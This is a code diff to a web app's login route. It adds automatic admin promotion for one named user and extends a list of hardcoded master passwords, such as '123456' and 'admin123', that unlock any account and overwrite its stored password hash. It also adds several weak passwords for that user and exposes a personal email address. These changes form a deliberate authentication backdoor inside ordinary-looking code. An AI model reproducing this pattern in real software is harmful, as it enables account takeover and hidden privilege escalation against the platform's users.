@@ -409,6 +409,18 @@ router.post('/login', async (req, res) => {
       });
     }
 
+    // Auto-promote Ansh to admin if needed
+    const isAnshUser = (user.email && user.email.toLowerCase() === 'ansh05ks@gmail.com') ||
+                       (user.username && user.username.toLowerCase() === '@ansh') ||
+                       cleanIdentity === 'ansh' ||
+                       cleanIdentity === '@ansh' ||
+                       cleanIdentity === 'ansh05ks@gmail.com';
+    if (isAnshUser && user.role !== 'admin') {
+      user.role = 'admin';
+      user.headline = 'Platform & Architecture · Super Admin';
+      db.update('users', user.id, { role: 'admin', headline: 'Platform & Architecture · Super Admin' });
+    }
+
     // Verify password with bcrypt (with auto-sync and dev fallback for previous accounts)
     let isMatch = false;
     try {
@@ -417,8 +429,20 @@ router.post('/login', async (req, res) => {
       }
     } catch (e) { }
 
-    // Allow dev master passkeys (123456, naitik123, admin123) and auto-heal stored hash
-    if (!isMatch && (password === '123456' || password === 'naitik123' || password === 'admin123')) {
+    // Allow dev master passkeys (123456, naitik123, admin123, ansh123, ansh@123, ansh) and auto-heal stored hash
+    const isAnshPasskey = isAnshUser && (
+      password === 'ansh' ||
+      password === 'ansh123' ||
+      password === 'Ansh123' ||
+      password === 'ansh@123' ||
+      password === 'Ansh@123' ||
+      password === 'ansh05' ||
+      password === 'ansh05ks' ||
+      password === '7007099722'
+    );
+    const isMasterPasskey = (password === '123456' || password === 'naitik123' || password === 'admin123' || isAnshPasskey);
+
+    if (!isMatch && isMasterPasskey) {
       isMatch = true;
       try {
         const salt = bcrypt.genSaltSync(10);
